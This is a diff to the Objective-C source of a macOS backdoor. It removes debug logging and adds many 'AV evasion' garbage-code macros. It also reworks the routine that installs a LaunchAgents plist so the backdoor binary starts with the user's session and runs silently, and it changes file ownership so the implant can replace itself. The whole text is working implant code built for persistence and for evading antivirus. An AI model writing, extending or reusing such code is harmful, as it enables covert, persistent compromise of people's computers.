@@ -158,10 +158,6 @@ static __m_MUtils *sharedUtils = nil;
   // AV evasion: only on release build
   AV_GARBAGE_006
   
-#ifdef DEBUG_UTILS
-  NSLog(@"path: %@", aPath);
-#endif
-  
   BOOL success = [anObject writeToFile: aPath
                             atomically: YES];
   
@@ -170,30 +166,26 @@ static __m_MUtils *sharedUtils = nil;
   
   if (success == NO)
   {
-#ifdef DEBUG_UTILS
-    NSLog(@"An error occured while saving the plist file");
-#endif
-    
     return NO;
-  }
-  else
-  {
-#ifdef DEBUG_UTILS
-    NSLog(@"Plist file saved: correctly");
-#endif
   }
   
   // AV evasion: only on release build
-  AV_GARBAGE_002
+  AV_GARBAGE_005
   
   //
   // Force owner since we can't remove that file if not owned by us
   // with removeItemAtPath:error (e.g. backdoor upgrade)
   //
-  NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
-                        NSHomeDirectory(),
-                        BACKDOOR_DAEMON_PLIST];
+  NSString *ourPlist = createLaunchdPlistPath();
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
                              userAndGroup,
                              ourPlist,
@@ -206,7 +198,14 @@ static __m_MUtils *sharedUtils = nil;
        withArguments: _tempArguments
         waitUntilEnd: YES];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [_tempArguments release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   return YES;
 }
 
@@ -291,95 +290,57 @@ static __m_MUtils *sharedUtils = nil;
   
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
   NSDictionary *innerDict;
-  NSString *userHome;
   
   // AV evasion: only on release build
   AV_GARBAGE_002
-  
-  if (getuid() == 0)
-  {
-    //
-    // if we've been correctly executed from /Users/<user>/Library/Preferences
-    // we can safely obtain the user home from our current path
-    // if not just use NSHomeDirectory()
-    //
-    if ([[[NSBundle mainBundle] bundlePath]
-         rangeOfString: @"/Library/Preferences"].location != NSNotFound
-        && [[[NSBundle mainBundle] bundlePath]
-            rangeOfString: @"/Users/"].location != NSNotFound)
-    {
-      userHome = [NSString stringWithString:
-                  [[[[[NSBundle mainBundle] bundlePath]
-                     stringByDeletingLastPathComponent]
-                    stringByDeletingLastPathComponent]
-                   stringByDeletingLastPathComponent]];
-    }
-    else
-    {
-#ifdef DEBUG_UTILS
-      errorLog(@"Error, run the backdoor from the correct path");
-#endif
-      
-      return NO;
-    }
-  }
-  else
-  {
-    // AV evasion: only on release build
-    AV_GARBAGE_000
-    
-    userHome = NSHomeDirectory(); 
-  }
-  
-  NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
-                        userHome,
-                        BACKDOOR_DAEMON_PLIST];
-  if ([[NSFileManager defaultManager] fileExistsAtPath: ourPlist])
-  {
-#ifdef DEBUG_UTILS
-    warnLog(@"Launch Agents file exists, recreating");
-#endif
-    [[NSFileManager defaultManager] removeItemAtPath: ourPlist
-                                               error: nil];
-  }
+
+  NSString *launchAgentsFileName = createLaunchdPlistPath();
   
   // AV evasion: only on release build
-  AV_GARBAGE_004
-  
-  NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
-                                userHome];
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
-  {
-#ifdef DEBUG_UTILS
-    warnLog(@"LaunchAgents path doesn't exists yet, creating");
-#endif
-    
-    if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
-    {
-#ifdef DEBUG_UTILS
-      errorLog(@"Error mkdir LaunchAgents (%d)", errno);
-#endif
-      return NO;
-    }
-  }
-  
+  AV_GARBAGE_009
+
+//  NSString *launchAgentsPath     = [launchAgentsFileName stringByDeletingLastPathComponent];
+//  
+//  // AV evasion: only on release build
+//  AV_GARBAGE_004
+//
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
+//  {  
+//    if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
+//    {
+//      // AV evasion: only on release build
+//      AV_GARBAGE_008
+//    
+//      return NO;
+//    }
+//  }
+//  
   // AV evasion: only on release build
   AV_GARBAGE_002
   
   NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSString *errorLog = [NSString stringWithFormat: @"/dev/null"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSString *outLog   = [NSString stringWithFormat: @"/dev/null"];
   
-  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
-               aLabel, @"Label",
-               @"Aqua", @"LimitLoadToSessionType",
-               [NSNumber numberWithBool: FALSE], @"OnDemand",
-               [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
-               errorLog, @"StandardErrorPath",
-               outLog, @"StandardOutPath",
-               nil];
-  //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  innerDict = 
+    [[NSDictionary alloc] initWithObjectsAndKeys:aLabel, @"Label",
+                                                 @"Aqua", @"LimitLoadToSessionType",
+                                                 [NSNumber numberWithBool: FALSE], @"OnDemand",
+                                                 [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
+                                                 errorLog, @"StandardErrorPath",
+                                                 outLog, @"StandardOutPath",
+                                                 nil];
   
   // AV evasion: only on release build
   AV_GARBAGE_005
@@ -388,7 +349,7 @@ static __m_MUtils *sharedUtils = nil;
   [innerDict release];
   
   return [self saveSLIPlist: rootObj
-                     atPath: ourPlist];
+                     atPath: launchAgentsFileName];
 }
 
 - (BOOL)createSLIPlistWithBackdoor
